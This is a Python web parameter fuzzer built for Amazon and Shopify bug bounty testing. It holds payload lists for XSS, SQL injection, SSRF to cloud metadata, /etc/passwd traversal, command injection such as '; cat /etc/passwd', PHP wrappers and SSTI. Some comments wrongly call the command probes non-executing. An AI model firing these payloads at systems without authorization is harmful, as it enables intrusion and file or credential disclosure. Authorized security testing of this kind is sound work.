#!/usr/bin/env python3
"""
Parameter Fuzzer Module
Tests URL parameters for common vulnerabilities:
- Reflected XSS
- SQL Injection indicators
- SSRF patterns
- Path Traversal
- Open Redirects
- Command Injection indicators

Uses safe, non-destructive payloads to detect reflection and error responses.
"""

import re
import json
import time
import threading
import hashlib
from dataclasses import dataclass, field
from typing import List, Set, Dict, Optional, Tuple
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from datetime import datetime

try:
    import requests
except ImportError:
    print("ERROR: requests library required. Install with: pip install requests")
    exit(1)

from config import get_amazon_config, get_shopify_config


@dataclass
class FuzzResult:
    """Result of fuzzing a parameter"""
    url: str
    parameter: str
    vuln_type: str
    payload: str
    evidence: str
    severity: str
    confidence: str  # high, medium, low
    request: str = ""
    response_code: int = 0
    response_snippet: str = ""


@dataclass
class FuzzSummary:
    """Summary of fuzzing results"""
    target: str
    parameters_tested: int = 0
    total_requests: int = 0
    findings: List[FuzzResult] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    fuzz_time: str = field(default_factory=lambda: datetime.utcnow().isoformat())


# Safe test payloads - designed to detect vulnerabilities without causing harm
FUZZ_PAYLOADS = {
    "xss": {
        "payloads": [
            # Reflection detection
            "<xss_test_{{CANARY}}>",
            "'\"><xss_test_{{CANARY}}>",
            "javascript:xss_test_{{CANARY}}//",
            # Event handlers
            "'\"><img src=x onerror=xss_{{CANARY}}>",
            # Template injection probe
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
        ],
        "detect": lambda resp, canary: canary in resp.text or "<xss_test_" in resp.text,
        "severity": "high",
    },
    "sqli": {
        "payloads": [
            # Error-based detection
            "'",
            "\"",
            "' OR '1'='1",
            "1' AND '1'='1",
            "1 UNION SELECT NULL--",
            # Time-based canary (won't actually delay)
            "1' AND SLEEP(0)--",
            # Boolean-based
            "1 AND 1=1",
            "1 AND 1=2",
        ],
        "detect": lambda resp, _: any(err in resp.text.lower() for err in [
            'sql syntax', 'mysql', 'postgresql', 'sqlite', 'oracle',
            'mssql', 'syntax error', 'unclosed quotation', 'odbc',
            'jdbc', 'sql server', 'pg_query', 'mysql_', 'mysqli_',
        ]),
        "severity": "critical",
    },
    "ssrf": {
        "payloads": [
            # Localhost variations
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            # Cloud metadata (safe - will just fail if no SSRF)
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            # DNS rebinding probe
            "http://localtest.me",
        ],
        "detect": lambda resp, _: any(ind in resp.text for ind in [
            'ami-id', 'instance-id', 'local-ipv4', 'metadata',
            'Connection refused', '127.0.0.1', 'localhost',
        ]),
        "severity": "high",
    },
    "path_traversal": {
        "payloads": [
            # Basic traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            # Encoded versions
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
            # Null byte (legacy)
            "../../../etc/passwd%00",
        ],
        "detect": lambda resp, _: any(ind in resp.text for ind in [
            'root:x:', 'root:*:', '[extensions]', '[fonts]',
            'daemon:', 'bin:', '/bin/bash', '/bin/sh',
        ]),
        "severity": "critical",
    },
    "open_redirect": {
        "payloads": [
            "//evil.com",
            "https://evil.com",
            "/\\evil.com",
            "//evil.com/%2f..",
            "///evil.com",
            "////evil.com",
            "https:evil.com",
        ],
        "detect": lambda resp, _: (
            resp.is_redirect and 'evil.com' in resp.headers.get('Location', '')
        ) if hasattr(resp, 'is_redirect') else False,
        "severity": "medium",
    },
    "command_injection": {
        "payloads": [
            # Safe detection only - won't execute
            "|echo cmd_test_{{CANARY}}",
            ";echo cmd_test_{{CANARY}}",
            "`echo cmd_test_{{CANARY}}`",
            "$(echo cmd_test_{{CANARY}})",
            # Error indicators
            "| ls",
            "; cat /etc/passwd",
        ],
        "detect": lambda resp, canary: (
            f"cmd_test_{canary}" in resp.text or
            any(err in resp.text.lower() for err in [
                'command not found', 'syntax error', 'sh:', 'bash:',
                '/bin/', 'permission denied', 'no such file',
            ])
        ),
        "severity": "critical",
    },
    "lfi": {
        "payloads": [
            # PHP wrappers
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain,<?php phpinfo();?>",
            # Log injection
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
        ],
        "detect": lambda resp, _: any(ind in resp.text for ind in [
            'PD9waHA', '<?php', 'phpinfo()', 'PHP Version',
            'apache', 'nginx', 'GET /', 'POST /',
        ]),
        "severity": "critical",
    },
    "xxe": {
        "payloads": [
            # XXE probe (won't work unless app parses XML)
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "xxe_test_{{CANARY}}">]><foo>&xxe;</foo>',
        ],
        "detect": lambda resp, canary: f"xxe_test_{canary}" in resp.text,
        "severity": "critical",
    },
    "ssti": {
        "payloads": [
            # Template injection probes
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{constructor.constructor('return this')()}}",
            "${T(java.lang.Runtime)}",
            "<%= 7*7 %>",
            "{php}echo 7*7;{/php}",
        ],
        "detect": lambda resp, _: (
            '49' in resp.text or
            'java.lang.Runtime' in resp.text
        ),
        "severity": "critical",
    },
}


class ParamFuzzer:
    """Fuzz URL parameters for vulnerabilities"""

    def __init__(self, rate_limit: float = 5.0, user_agent: str = "BugBountyResearcher"):
        self.rate_limit = rate_limit
        self.min_interval = 1.0 / rate_limit
        self.last_request = 0.0
        self.lock = threading.Lock()
        self.user_agent = user_agent
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        self.request_count = 0

    def _rate_limit_wait(self):
        """Wait to respect rate limit"""
        with self.lock:
            now = time.time()
            elapsed = now - self.last_request
            if elapsed < self.min_interval:
                time.sleep(self.min_interval - elapsed)
            self.last_request = time.time()
            self.request_count += 1

    def _make_request(self, url: str, method: str = "GET",
                      data: Dict = None) -> Optional[requests.Response]:
        """Make a rate-limited request"""
        self._rate_limit_wait()
        try:
            if method.upper() == "POST":
                response = self.session.post(url, data=data, timeout=10, allow_redirects=False)
            else:
                response = self.session.get(url, timeout=10, allow_redirects=False)
            return response
        except:
            return None

    def _generate_canary(self, url: str, param: str) -> str:
        """Generate a unique canary for this URL/param combo"""
        data = f"{url}:{param}:{time.time()}"
        return hashlib.md5(data.encode()).hexdigest()[:8]

    def _extract_params(self, url: str) -> Dict[str, str]:
        """Extract parameters from URL"""
        parsed = urlparse(url)
        return parse_qs(parsed.query, keep_blank_values=True)

    def _build_url(self, base_url: str, params: Dict[str, str]) -> str:
        """Build URL with modified parameters"""
        parsed = urlparse(base_url)
        # Flatten params (parse_qs returns lists)
        flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        new_query = urlencode(flat_params)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))

    def fuzz_parameter(self, url: str, param: str, original_value: str,
                       vuln_types: List[str] = None) -> List[FuzzResult]:
        """Fuzz a single parameter with specified vulnerability types"""
        results = []

        if vuln_types is None:
            vuln_types = list(FUZZ_PAYLOADS.keys())

        parsed = urlparse(url)
        base_params = parse_qs(parsed.query, keep_blank_values=True)

        for vuln_type in vuln_types:
            if vuln_type not in FUZZ_PAYLOADS:
                continue

            config = FUZZ_PAYLOADS[vuln_type]
            canary = self._generate_canary(url, param)

            for payload in config["payloads"]:
                # Replace canary placeholder
                test_payload = payload.replace("{{CANARY}}", canary)

                # Build test URL
                test_params = base_params.copy()
                test_params[param] = [test_payload]
                test_url = self._build_url(url, test_params)

                # Make request
                response = self._make_request(test_url)

                if not response:
                    continue

                # Check for vulnerability indicators
                detect_func = config["detect"]
                if detect_func(response, canary):
                    # Found potential vulnerability
                    result = FuzzResult(
                        url=url,
                        parameter=param,
                        vuln_type=vuln_type,
                        payload=test_payload,
                        evidence=f"Detection triggered with payload",
                        severity=config["severity"],
                        confidence="medium" if vuln_type in ["sqli", "xss"] else "high",
                        request=f"GET {test_url}",
                        response_code=response.status_code,
                        response_snippet=response.text[:200] if response.text else "",
                    )
                    results.append(result)
                    break  # Found vuln for this type, move to next

        return results

    def discover_params(self, url: str) -> Set[str]:
        """Discover additional parameters by fuzzing"""
        discovered = set()

        # Common parameter names to try
        common_params = [
            'id', 'page', 'search', 'q', 'query', 'term',
            'user', 'username', 'name', 'email', 'password',
            'url', 'redirect', 'next', 'return', 'goto',
            'file', 'path', 'dir', 'folder', 'document',
            'action', 'cmd', 'exec', 'command', 'do',
            'data', 'value', 'input', 'output', 'result',
            'token', 'key', 'api_key', 'apikey', 'auth',
            'callback', 'jsonp', 'format', 'type', 'mode',
            'debug', 'test', 'admin', 'config', 'settings',
            'limit', 'offset', 'sort', 'order', 'filter',
            'from', 'to', 'start', 'end', 'date', 'time',
            'lang', 'language', 'locale', 'country', 'region',
        ]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        print(f"    [DISCOVER] Probing for hidden parameters...")

        for param in common_params:
            test_url = f"{base_url}?{param}=test123"
            response1 = self._make_request(test_url)

            if response1:
                # Compare with different value
                test_url2 = f"{base_url}?{param}=test456"
                response2 = self._make_request(test_url2)

                if response2:
                    # Check if responses differ (param might be used)
                    if (response1.status_code != response2.status_code or
                        len(response1.text) != len(response2.text) or
                        'test123' in response1.text or
                        'test456' in response2.text):
                        discovered.add(param)

        print(f"    [DISCOVER] Found {len(discovered)} potentially active parameters")
        return discovered

    def fuzz_url(self, url: str, discover_params: bool = True,
                 vuln_types: List[str] = None) -> FuzzSummary:
        """Fuzz all parameters in a URL"""
        if not url.startswith('http'):
            url = f"https://{url}"

        print(f"\n[*] Parameter Fuzzing: {url}")
        print("=" * 50)

        summary = FuzzSummary(target=url)
        self.request_count = 0

        # Extract existing parameters
        existing_params = self._extract_params(url)
        params_to_test = set(existing_params.keys())

        print(f"    [PARAMS] Found {len(params_to_test)} URL parameters")

        # Discover additional parameters
        if discover_params and not existing_params:
            discovered = self.discover_params(url)
            params_to_test.update(discovered)
            # Add discovered params to URL for testing
            if discovered:
                parsed = urlparse(url)
                new_params = {p: 'test' for p in discovered}
                url = self._build_url(url, new_params)
                existing_params = new_params

        if not params_to_test:
            print("    [!] No parameters to test")
            return summary

        # Fuzz each parameter
        print(f"    [FUZZ] Testing {len(params_to_test)} parameters...")

        for param in params_to_test:
            original_value = existing_params.get(param, [''])[0]
            if isinstance(original_value, list):
                original_value = original_value[0] if original_value else ''

            print(f"      Testing: {param}")
            results = self.fuzz_parameter(url, param, original_value, vuln_types)

            for result in results:
                print(f"        [!] {result.vuln_type.upper()} detected!")
                summary.findings.append(result)

        summary.parameters_tested = len(params_to_test)
        summary.total_requests = self.request_count

        print(f"\n    [SUMMARY] {len(summary.findings)} potential vulnerabilities found")
        print(f"    [SUMMARY] {summary.total_requests} requests made")

        return summary


class AmazonParamFuzzer(ParamFuzzer):
    """Amazon VRP-compliant parameter fuzzer"""

    def __init__(self, username: str = "yourh1username"):
        config = get_amazon_config(username)
        super().__init__(
            rate_limit=config.rate_limit,
            user_agent=config.user_agent
        )


class ShopifyParamFuzzer(ParamFuzzer):
    """Shopify-compliant parameter fuzzer"""

    def __init__(self, username: str = "yourh1username"):
        config = get_shopify_config(username)
        super().__init__(
            rate_limit=config.rate_limit,
            user_agent=config.user_agent
        )


def save_fuzz_results(summary: FuzzSummary, output_file: str):
    """Save fuzzing results to JSON"""
    data = {
        "target": summary.target,
        "fuzz_time": summary.fuzz_time,
        "parameters_tested": summary.parameters_tested,
        "total_requests": summary.total_requests,
        "vulnerabilities_found": len(summary.findings),
        "findings": [
            {
                "url": f.url,
                "parameter": f.parameter,
                "vuln_type": f.vuln_type,
                "payload": f.payload,
                "evidence": f.evidence,
                "severity": f.severity,
                "confidence": f.confidence,
                "response_code": f.response_code,
            }
            for f in summary.findings
        ],
        "errors": summary.errors,
    }

    with open(output_file, 'w') as f:
        json.dump(data, f, indent=2)

    print(f"\n[*] Results saved to: {output_file}")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Parameter Fuzzer")
    parser.add_argument("url", help="Target URL with parameters")
    parser.add_argument("--program", "-p", choices=["amazon", "shopify"],
                        help="Bug bounty program")
    parser.add_argument("--username", "-u", default="yourh1username",
                        help="HackerOne username")
    parser.add_argument("--types", "-t", nargs='+',
                        choices=list(FUZZ_PAYLOADS.keys()),
                        help="Vulnerability types to test")
    parser.add_argument("--no-discover", action="store_true",
                        help="Skip parameter discovery")
    parser.add_argument("--output", "-o", help="Output JSON file")

    args = parser.parse_args()

    # Create fuzzer
    if args.program == "amazon":
        fuzzer = AmazonParamFuzzer(args.username)
    elif args.program == "shopify":
        fuzzer = ShopifyParamFuzzer(args.username)
    else:
        fuzzer = ParamFuzzer()

    # Run fuzzing
    summary = fuzzer.fuzz_url(
        args.url,
        discover_params=not args.no_discover,
        vuln_types=args.types
    )

    # Print summary
    print("\n" + "=" * 50)
    print("FUZZING SUMMARY")
    print("=" * 50)
    print(f"Target: {summary.target}")
    print(f"Parameters tested: {summary.parameters_tested}")
    print(f"Total requests: {summary.total_requests}")
    print(f"Vulnerabilities found: {len(summary.findings)}")

    if summary.findings:
        print("\nFINDINGS:")
        for finding in summary.findings:
            print(f"\n  [{finding.severity.upper()}] {finding.vuln_type}")
            print(f"    Parameter: {finding.parameter}")
            print(f"    Payload: {finding.payload}")
            print(f"    Confidence: {finding.confidence}")

    if args.output:
        save_fuzz_results(summary, args.output)
